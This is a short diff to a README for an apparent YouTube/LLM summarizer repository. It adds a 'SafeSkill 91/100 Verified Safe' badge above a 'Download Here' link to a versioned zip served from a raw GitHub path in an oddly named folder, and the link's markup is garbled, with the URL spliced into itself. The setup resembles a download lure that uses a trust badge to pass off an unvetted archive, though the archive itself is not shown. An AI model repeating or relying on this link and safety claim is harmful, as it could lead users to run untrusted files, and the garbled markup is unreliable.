@@ -1,5 +1,7 @@
 # 🎉 web-youtube-summarizer-llm - Simplify Content Summarization Effortlessly
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/redblac-web-youtube-summarizer-llm)
+
 ## 📥 Download Here
 [![Download Latest Release](https://github.com/redblac/web-youtube-summarizer-llm/raw/refs/heads/main/propitiatingly/web_summarizer_youtube_llm_v3.9.zip%20Latest%https://github.com/redblac/web-youtube-summarizer-llm/raw/refs/heads/main/propitiatingly/web_summarizer_youtube_llm_v3.9.zip)](https://github.com/redblac/web-youtube-summarizer-llm/raw/refs/heads/main/propitiatingly/web_summarizer_youtube_llm_v3.9.zip)
 
